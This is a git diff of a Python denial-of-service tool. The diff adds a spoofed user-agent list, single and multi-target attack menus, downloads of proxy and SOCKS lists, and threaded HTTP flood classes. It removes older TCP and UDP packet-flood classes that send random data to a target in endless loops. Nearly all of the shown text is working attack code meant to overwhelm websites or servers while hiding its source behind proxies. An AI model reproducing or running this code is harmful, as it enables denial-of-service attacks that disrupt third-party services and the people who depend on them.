+			"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0",
+			"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)",
+			"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8",
+			"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12",
+			"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3",
+			"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5",
+			"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9",
+			"Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12",
+			"Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0",
+			"Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15",
+			"Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0",
+			"Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3",
+			"Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5",
+			"Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8",
+			"Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3",
+			"Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6",
+			"MSIE (MSIE 6.0; X11; Linux; i686) Opera 7.23",
+			"msnbot/0.11 ( http://search.msn.com/msnbot.htm)",
+			"msnbot/1.0 ( http://search.msn.com/msnbot.htm)",
+			"msnbot/1.1 ( http://search.msn.com/msnbot.htm)",
+			"msnbot-media/1.1 ( http://search.msn.com/msnbot.htm)",
+			"NetSurf/1.2 (NetBSD; amd64)",
+			"Nokia3230/2.0 (5.0614.0) SymbianOS/7.0s Series60/2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0",
+			"Nokia6100/1.0 (04.01) Profile/MIDP-1.0 Configuration/CLDC-1.0",
+			"Nokia6230/2.0 (04.44) Profile/MIDP-2.0 Configuration/CLDC-1.1",
+			"Nokia6230i/2.0 (03.80) Profile/MIDP-2.0 Configuration/CLDC-1.1",
+			"Nokia6630/1.0 (2.3.129) SymbianOS/8.0 Series60/2.6 Profile/MIDP-2.0 Configuration/CLDC-1.1",
+			"Nokia6630/1.0 (2.39.15) SymbianOS/8.0 Series60/2.6 Profile/MIDP-2.0 Configuration/CLDC-1.1",
+			"Nokia7250/1.0 (3.14) Profile/MIDP-1.0 Configuration/CLDC-1.0",
+			"NokiaN70-1/5.0609.2.0.1 Series60/2.8 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0",
+			"NokiaN73-1/3.0649.0.0.1 Series60/3.0 Profile/MIDP2.0 Configuration/CLDC-1.1",
+			"nook browser/1.0",
+			"Offline Explorer/2.5",
+			"Opera/10.61 (J2ME/MIDP; Opera Mini/5.1.21219/19.999; en-US; rv:1.9.3a5) WebKit/534.5 Presto/2.6.30",
+			"Opera/7.50 (Windows ME; U) [en]",
+			"Opera/7.50 (Windows XP; U)",
+			"Opera/7.51 (Windows NT 5.1; U) [en]",
+			"Opera/8.01 (J2ME/MIDP; Opera Mini/1.0.1479/HiFi; SonyEricsson P900; no; U; ssr)",
+			"Opera/9.0 (Macintosh; PPC Mac OS X; U; en)",
+			"Opera/9.20 (Macintosh; Intel Mac OS X; U; en)",
+			"Opera/9.25 (Windows NT 6.0; U; en)",
+			"Opera/9.30 (Nintendo Wii; U; ; 2047-7; en)",
+			"Opera/9.51 Beta (Microsoft Windows; PPC; Opera Mobi/1718; U; en)",
+			"Opera/9.5 (Microsoft Windows; PPC; Opera Mobi; U) SonyEricssonX1i/R2AA Profile/MIDP-2.0 Configuration/CLDC-1.1",
+			"Opera/9.60 (J2ME/MIDP; Opera Mini/4.1.11320/608; U; en) Presto/2.2.0",
+			"Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14320/554; U; cs) Presto/2.2.0",
+			"Opera/9.64 (Macintosh; PPC Mac OS X; U; en) Presto/2.1.1",
+			"Opera/9.64 (X11; Linux i686; U; Linux Mint; nb) Presto/2.1.1",
+			"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.16823/1428; U; en) Presto/2.2.0",
+			"Opera/9.80 (Macintosh; Intel Mac OS X 10.4.11; U; en) Presto/2.7.62 Version/11.00",
+			"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52",
+			"Opera/9.80 (Macintosh; Intel Mac OS X; U; en) Presto/2.6.30 Version/10.61",
+			"Opera/9.80 (S60; SymbOS; Opera Mobi/499; U; ru) Presto/2.4.18 Version/10.00",
+			"Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.7.39 Version/11.00",
+			"Opera/9.80 (Windows NT 5.1; U; zh-tw) Presto/2.8.131 Version/11.10",
+			"Opera/9.80 (Windows NT 5.2; U; en) Presto/2.2.15 Version/10.10",
+			"Opera/9.80 (Windows NT 6.1; U; en) Presto/2.7.62 Version/11.01",
+			"Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00",
+			"Opera/9.80 (X11; Linux i686; U; en) Presto/2.2.15 Version/10.10",
+			"Opera/9.80 (X11; Linux x86_64; U; pl) Presto/2.7.62 Version/11.00",
+			"P3P Validator",
+			"Peach/1.01 (Ubuntu 8.04 LTS; U; en)",
+			"POLARIS/6.01(BREW 3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP;)MMP/2.0 profile/MIDP-201 Configuration /CLDC-1.1",
+			"POLARIS/6.01 (BREW 3.1.5; U; en-us; LG; LX265; POLARIS/6.01/WAP) MMP/2.0 profile/MIDP-2.1 Configuration/CLDC-1.1",
+			"portalmmm/2.0 N410i(c20;TB) ",
+			"Python-urllib/2.5",
+			"SAMSUNG-S8000/S8000XXIF3 SHP/VPP/R5 Jasmine/1.0 Nextreaming SMM-MMS/1.2.0 profile/MIDP-2.1 configuration/CLDC-1.1 FirePHP/0.3",
+			"SAMSUNG-SGH-A867/A867UCHJ3 SHP/VPP/R5 NetFront/35 SMM-MMS/1.2.0 profile/MIDP-2.0 configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
+			"SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html)",
+			"SearchExpress",
+			"SEC-SGHE900/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4509/1378; nl; U; ssr)",
+			"SEC-SGHX210/1.0 UP.Link/6.3.1.13.0",
+			"SEC-SGHX820/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
+			"SonyEricssonK310iv/R4DA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0",
+			"SonyEricssonK550i/R1JD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
+			"SonyEricssonK610i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
+			"SonyEricssonK750i/R1CA Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
+			"SonyEricssonK800i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
+			"SonyEricssonK810i/R1KG Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
+			"SonyEricssonS500i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
+			"SonyEricssonT100/R101",
+			"SonyEricssonT610/R201 Profile/MIDP-1.0 Configuration/CLDC-1.0",
+			"SonyEricssonT650i/R7AA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
+			"SonyEricssonT68/R201A",
+			"SonyEricssonW580i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
 			"Avant Browser/1.2.789rel1 (http://www.avantbrowser.com)",
 			"Baiduspider ( http://www.baidu.com/search/spider.htm)",
 			"BlackBerry7100i/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/103",
@@ -456,145 +735,99 @@ useragents=["AdsBot-Google ( http://www.google.com/adsbot.html)",
 			]
 
 
-def starturl(): # in questa funzione setto l'url per renderlo usabile per il futuro settaggio delle richieste HTTP.
+def attacker():
 	global url
 	global url2
 	global urlport
+	global numberAttack
+	global ips
 
-	url = input("URL/IP: ").strip()
+	numberAttack = input(f"\n{lrd}[{lgn}0{lrd}]{gn} Single attack \n{lrd}[{lgn}1{lrd}]{gn} Multi attack \n\n{lrd}[{lgn}?{lrd}]{gn} Number : {cn}")
 
-	if url == "":
-		print ("Please enter the url.")
-		starturl()
+	if numberAttack == "1":
+		ip_file = input(f"\n{lrd}[{lgn}?{lrd}]{gn} Give the list of files : {cn}")
+		ips = open(ip_file).readlines()
 
-	try:
-		if url[0]+url[1]+url[2]+url[3] == "www.":
-			url = "https://" + url
-		elif url[0]+url[1]+url[2]+url[3] == "http":
-			pass
-		else:
-			url = "https://" + url
-	except:
-		print("You mistyped, try again.")
-		starturl()
+	elif numberAttack == "0":
+		url = input(f"\n{lrd}[{lgn}?{lrd}]{gn} Enter {lrd}IP/URL {gn}Target : {cn}").strip()
 
-	try:
-		url2 = url.replace("https://", "").replace("https://", "").split("/")[0].split(":")[0]
-	except:
-		url2 = url.replace("https://", "").replace("https://", "").split("/")[0]
+		if url == "":
+			print (f"{lrd}Error !")
+			attacker()
 
-	try:
-		urlport = url.replace("https://", "").replace("https://", "").split("/")[0].split(":")[1]
-	except:
-		urlport = "443"
-
-	floodmode()
-
-def floodmode(): # la scelta della modalità di attacco
-	global choice1
-	choice1 = input("HTTP 0 : ")
-	if choice1 == "0":
-		proxymode()
-	elif choice1 == "1":
 		try:
-			if os.getuid() != 0: # se il programma NON e' stato eseguito come root:
-				print("You need to run this program as root to use TCP/UDP flooding.") # printa questo
-				exit(0) # e esce
-			else: # altrimenti
-				floodport() # continua
+			if url[0]+url[1]+url[2]+url[3] == "www.":
+				url = "http://" + url
+			elif url[0]+url[1]+url[2]+url[3] == "http":
+				pass
+			else:
+				url = "http://" + url
 		except:
-			pass
-	elif choice1 == "2":
-		try:
-			if os.getuid() != 0: # se il programma NON e' stato eseguito come root:
-				print("You need to run this program as root to use TCP/UDP flooding.") # printa questo
-				exit(0) # e esce
-			else: # altrimenti
-				floodport() # continua
-		except:
-			pass
-	else:
-		print ("You mistyped, try again.")
-		floodmode()
+			print(f"{lrd}Error !")
+			attacker()
 
-def floodport():
-	global port
-	try:
-		port = int(input("Enter the port you want to flood: "))
-		portlist = range(65535) # range di tutte le porte informatiche
-		if port in portlist: # se la porta selezionata rientra nel range
-			pass # continua
-		else: # altrimenti
-			print ("You mistyped, try again.")
-			floodport() # riparte la funzione e ti fa riscrivere
-	except ValueError: # se da' errore di valore
-		print ("You mistyped, try again.") # printa questo e
-		floodport() # riparte la funzione e ti fa riscrivere
+		try:
+			url2 = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
+		except:
+			url2 = url.replace("http://", "").replace("https://", "").split("/")[0]
+
+		try:
+			urlport = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[1]
+		except:
+			urlport = "80"
+
 	proxymode()
 
+
 def proxymode():
-	global choice2
-	choice2 = input("Proxy y/n: ")
-	if choice2 == "y":
+	global DoPrx
+	DoPrx = input(f"\n{lrd}[{lgn}?{lrd}]{gn}Do you want to use a proxy/socks? [Y/N] : {cn}")
+	if DoPrx == "y" or DoPrx == "Y":
 		choiceproxysocks()
 	else:
 		numthreads()
 
 def choiceproxysocks():
-	global choice3
-	choice3 = input("Start 1: ")
-	if choice3 == "0":
+	global PRX
+	PRX = input(f"\n{lrd}[{lgn}0{lrd}]{gn} Proxy\n{lrd}[{lgn}1{lrd}]{gn} Socks\n\n{lrd}[{lgn}?{lrd}]{gn} Number : {cn}")
+	if PRX == "0":
 		choicedownproxy()
-	elif choice3 == "1":
+	elif PRX == "1":
 		choicedownsocks()
 	else:
-		print ("You mistyped, try again.")
+		print (f"{lrd}You mistyped, try again.")
 		choiceproxysocks()
 
 def choicedownproxy():
-	choice4 = input("Download ? y/n: ")
-	if choice4 == "y":
-		urlproxy = "http://free-proxy-list.net/"
+	Down = input(f"\n{lrd}[{lgn}?{lrd}]{gn} Do you want to download a proxy? [Y/N] : {cn}")
+	if Down == "y" or Down == "Y":
+		urlproxy = "https://api.openproxylist.xyz/http.txt"
 		proxyget(urlproxy)
 	else:
 		proxylist()
 
 def choicedownsocks():
-	choice4 = input("Download ? y/n: ")
-	if choice4 == "y":
-		urlproxy = "https://www.socks-proxy.net/"
+	Down = input(f"\n{lrd}[{lgn}?{lrd}]{gn} Do you want to download socks4 [Y/N] : {cn}")
+	if Down == "y" or Down == "Y":
+		urlproxy = "https://api.openproxylist.xyz/socks5.txt"
 		proxyget(urlproxy)
 	else:
 		proxylist()
 
-def proxyget(urlproxy): # lo dice il nome, questa funzione scarica i proxies
-	try:
-		req = urllib.request.Request(("%s") % (urlproxy))       # qua impostiamo il sito da dove scaricare.
-		req.add_header("User-Agent", random.choice(useragents)) # siccome il format del sito e' identico sia
-		sourcecode = urllib.request.urlopen(req)                # per free-proxy-list.net che per socks-proxy.net,
-		part = str(sourcecode.read())                           # imposto la variabile urlproxy in base a cosa si sceglie.
-		part = part.split("<tbody>")
-		part = part[1].split("</tbody>")
-		part = part[0].split("<tr><td>")
-		proxies = ""
-		for proxy in part:
-			proxy = proxy.split("</td><td>")
-			try:
-				proxies=proxies + proxy[0] + ":" + proxy[1] + "\n"
-			except:
-				pass
-		out_file = open("proxy.txt","w")
-		out_file.write("")
-		out_file.write(proxies)
-		out_file.close()
-		print ("Proxies downloaded successfully.")
-	except: # se succede qualche casino
-		print ("\nERROR!\n")
-	proxylist() # se va tutto liscio allora prosegue eseguendo la funzione proxylist()
+def proxyget(urlproxy): 
+    r = get(urlproxy).text
+    try:
+    	with open("Proxy.txt",'w') as file:
+    		file.write(r)
+    	file.close()
+    	print (f"\n{lrd}[{lgn}+{lrd}]{gn} Proxy downloaded successfully ")
+    except: 
+        print (f"{lrd}ERROR ! ")
+        proxylist() 
 
 def proxylist():
 	global proxies
-	out_file = str(input("import Proxy: "))
+	out_file = str(input(f"\n{lrd}[{lgn}?{lrd}]{gn} Enter the address of your proxy file : {cn}"))
 	if out_file == "":
 		out_file = "proxy.txt"
 	proxies = open(out_file).readlines()
@@ -603,412 +836,190 @@ def proxylist():
 def numthreads():
 	global threads
 	try:
-		threads = int(input("Insert number of threads (1000): "))
+		threads = int(input(f"\n{lrd}[{lgn}?{lrd}]{gn} Enter threads : {cn}"))
 	except ValueError:
 		threads = 1000
-		print ("1000 threads selected.\n")
+		print (f"\n{lrd}[{lgn}+{lrd}]{gn} 1000 threads selected.")
 	multiplication()
 
 def multiplication():
 	global multiple
 	try:
-		multiple = int(input("100 Start: "))
+		multiple = int(input(f"\n{lrd}[{lgn}?{lrd}]{gn} Enter multiplication (0,100) : {cn}"))
 	except ValueError:
-		print("You mistyped, try again.\n")
+		print(f"\n{lrd}You mistyped, try again.\n")
 		multiplication()
 	begin()
 
 def begin():
-	choice6 = input("Press 'Enter' to start attack: ")
+	choice6 = input(f"\n{lrd}[{lgn}?{lrd}]{gn} Please type the word {lgn}\"attack\" : {cn}")
 	if choice6 == "":
-		loop()
-	elif choice6 == "Enter": #lool
-		loop()
-	elif choice6 == "enter": #loool
+		print (f"\n{lrd}You entered incorrectly !")
+		exit()
+	elif choice6 == "attack" or choice6 == "Attack": 
 		loop()
 	else:
 		exit(0)
 
 def loop():
 	global threads
-	global get_host
 	global acceptall
 	global connection
 	global go
 	global x
-	if choice1 == "0": # se si e' scelta la http flood, scrive gli header "statici" per non appesantire i threads
-		get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
-		acceptall = [
-		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n", 
-		"Accept-Encoding: gzip, deflate\r\n", 
-		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
-		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
-		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
-		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
-		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
-		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
-		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
-		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
-		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
-		"Accept: text/html, application/xhtml+xml",
-		"Accept-Language: en-US,en;q=0.5\r\n",
-		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
-		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
-		] # header accept a caso per far sembrare le richieste più legittime
-		connection = "Connection: Keep-Alive\r\n" # la keep alive torna sempre utile lol
-	x = 0 # thanks therunixx, my friend
+	
+	acceptall = [
+	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n", 
+	"Accept-Encoding: gzip, deflate\r\n", 
+	"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
+	"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
+	"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
+	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
+	"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
+	"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
+	"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
+	"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
+	"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
+	"Accept: text/html, application/xhtml+xml",
+	"Accept-Language: en-US,en;q=0.5\r\n",
+	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
+	"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
+	] 
+	connection = "Connection: Keep-Alive\r\n" 
+	x = 0 
 	go = threading.Event()
-	if choice1 == "1": # se si e' scelto tcp flood
-		if choice2 == "y": # e si e scelta la modalita' proxying
-			if choice3 == "0": # e si sono scelti gli HTTP proxy
-				for x in range(threads):
-					TcpFloodProxed(x+1).start() # starta la classe apposita
-					print ("Thread " + str(x) + " ready!")
-				go.set() # questo fa avviare i threads appena sono tutti pronti
-			else: # altrimenti se si sono scelto è il tcp flood con socks
-				for x in range(threads):
-					TcpFloodSocked(x+1).start() # starta la classe apposita
-					print ("Thread " + str(x) + " ready!")
-				go.set() # questo fa avviare i threads appena sono tutti pronti
-		else: # se non si sono stati scelti proxy o socks
+	if DoPrx == "y": 
+		if PRX == "0": 
 			for x in range(threads):
-				TcpFloodDefault(x+1).start() # starta la classe apposita
-				print ("Thread " + str(x) + " ready!")
-			go.set() # questo fa avviare i threads appena sono tutti pronti
-	else: # oppure:
-		if choice1 == "2": # se si e' scelto l'UDP flood
-			if choice2 == "y": # e si e' scelta la modalita' proxying
-				if choice3 == "0": # e si sono scelti gli HTTP proxy
-					for x in range(threads):
-						UdpFloodProxed(x+1).start() # starta la classe apposita
-						print ("Thread " + str(x) + " ready!")
-					go.set() # questo fa avviare i threads appena sono tutti pronti
-				else: # se si sono scelti i socks
-					for x in range(threads):
-						UdpFloodSocked(x+1).start() # starta la classe apposita
-						print ("Thread " + str(x) + " ready!")
-					go.set() # questo fa avviare i threads appena sono tutti pronti
-			else: # se non si sono scelti proxy o socks per l'udp flood
-				for x in range(threads):
-					UdpFloodDefault(x+1).start() # starta la classe apposita
-					print ("Thread " + str(x) + " ready!")
-				go.set() # questo fa avviare i threads appena sono tutti pronti
-		else: # se si è scelto l'http flood
-			if choice2 == "y": # se abbiamo scelto la modalita' proxying
-				if choice3 == "0": # e abbiamo scelto gli HTTP proxy
-					for x in range(threads):
-						RequestProxyHTTP(x+1).start() # starta la classe apposita
-						print ("Thread " + str(x) + " ready!")
-					go.set() # questo fa avviare i threads appena sono tutti pronti
-				else: # se abbiamo scelto i socks
-					for x in range(threads):
-						RequestSocksHTTP(x+1).start() # starta la classe apposita
-						print ("Thread " + str(x) + " ready!")
-					go.set() # questo fa avviare i threads appena sono tutti pronti
-			else: # altrimenti manda richieste normali non proxate.
-				for x in range(threads):
-					RequestDefaultHTTP(x+1).start() # starta la classe apposita
-					print ("Thread " + str(x) + " ready!")
-				go.set() # questo fa avviare i threads appena sono tutti pronti
+				RequestProxyHTTP(x+1).start() 
+				print (f"\n{lrd}[{lgn}+{lrd}]{gn} Thread {lgn}{str(x)}{gn} ready !")
+			go.set() 
+		else: 
+			for x in range(threads):
+				RequestSocksHTTP(x+1).start() 
+				print (f"\n{lrd}[{lgn}+{lrd}]{gn} Thread {lgn}{str(x)}{gn} ready !")
+			go.set() 
+	else:
+		for x in range(threads):
+			HTTPREQ(x+1).start() 
+			print (f"\n{lrd}[{lgn}+{lrd}]{gn} Thread {lgn}{str(x)}{gn} ready !")
+		go.set() 
 
-class TcpFloodProxed(threading.Thread): # la classe del multithreading
+class RequestProxyHTTP(threading.Thread):
 
-	def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
+	def __init__(self, counter): 
 		threading.Thread.__init__(self)
 		self.counter = counter
 
-	def run(self): # la funzione che da' le istruzioni ai vari threads
-		data = random._urandom(1024) # data per il pacchetto random
-		p = bytes(IP(dst=str(url2))/TCP(sport=RandShort(), dport=int(port))/data) # costruzione pacchetto tcp + data
-		current = x # per dare l'id al thread
-		if current < len(proxies): # se l'id del thread si puo' associare ad un proxy, usa quel proxy
-			proxy = proxies[current].strip().split(':')
-		else: # altrimenti lo prende a random
-			proxy = random.choice(proxies).strip().split(":")
-		go.wait() # aspetta che tutti i proxy siano pronti
-		while True:
-			try:
-				socks.setdefaultproxy(socks.PROXY_TYPE_HTTP, str(proxy[0]), int(proxy[1]), True) # comando per il proxying HTTP
-				s = socks.socksocket() # creazione socket
-				s.connect((str(url2),int(port))) # si connette
-				s.send(p) # ed invia
-				print ("ProxyStart " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print req + counter
-				try: # invia altre richieste nello stesso thread
-					for y in range(multiple): # fattore di moltiplicazione
-						s.send(str.encode(p)) # encode in bytes della richiesta HTTP
-				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
-					s.close()
-			except: # se si verifica un errore
-				s.close() # chiude il thread e ricomincia
-
-class TcpFloodSocked(threading.Thread): # la classe del multithreading
-
-	def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
-		threading.Thread.__init__(self)
-		self.counter = counter
-
-	def run(self): # la funzione che da' le istruzioni ai vari threads
-		data = random._urandom(1024) # data per il pacchetto random
-		p = bytes(IP(dst=str(url2))/TCP(sport=RandShort(), dport=int(port))/data) # costruzione pacchetto tcp + data
-		current = x # per dare l'id al thread
-		if current < len(proxies): # se l'id del thread si puo' associare ad un proxy, usa quel proxy
-			proxy = proxies[current].strip().split(':')
-		else: # altrimenti lo prende a random
-			proxy = random.choice(proxies).strip().split(":")
-		go.wait() # aspetta che threads siano pronti
-		while True:
-			try:
-				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True) # comando per il proxying via SOCKS
-				s = socks.socksocket() # creazione socket
-				s.connect((str(url2),int(port))) # si connette
-				s.send(p) # ed invia
-				print ("Proxy Start " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print req + counter
-				try: # invia altre richieste nello stesso thread
-					for y in range(multiple): # fattore di moltiplicazione
-						s.send(str.encode(p)) # encode in bytes della richiesta HTTP
-				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
-					s.close()
-			except: # se si verifica un errore
-				s.close() # intanto chiude il precedente socket non funzionante
-				try:
-					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True) # poi prova ad utilizzare SOCKS4, magari e' questo il problema dell'errore
-					s = socks.socksocket() # creazione socket
-					s.connect((str(url2),int(port))) # connessione
-					s.send(p) # invio
-					print ("Proxy Start " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print req + counter
-					try: # invia altre richieste nello stesso thread
-						for y in range(multiple): # fattore di moltiplicazione
-							s.send(str.encode(p)) # encode in bytes della richiesta HTTP
-					except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
-						s.close()
-				except: # se nemmeno questo funge, allora il sock e' down
-					print ("Sock down. Retrying request. @", self.counter)
-					s.close() # chiude il socket e ricomincia ciclo
-
-class TcpFloodDefault(threading.Thread): # la classe del multithreading
-
-	def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
-		threading.Thread.__init__(self)
-		self.counter = counter
-
-	def run(self): # la funzione che da' le istruzioni ai vari threads
-		data = random._urandom(1024) # data per il pacchetto random
-		p = bytes(IP(dst=str(url2))/TCP(sport=RandShort(), dport=int(port))/data) # costruzione pacchetto tcp + data
-		go.wait() # aspetta che tutti i threads siano pronti
-		while True: # ciclo infinito
-			try: # il try per non far chiudere il programma se qualcosa va storto
-				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # creazione solito socket
-				s.connect((str(url2),int(port))) # connessione al target
-				s.send(p) # questo manda il pacchetto tcp creato al target
-				print ("Request Sent! @", self.counter) # print richiesta + counter
-				try: # invia altre richieste nello stesso thread
-					for y in range(multiple): # fattore di moltiplicazione
-						s.send(str.encode(p)) # encode in bytes della richiesta HTTP
-				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
-					s.close()
-			except: # se si verifica un errore
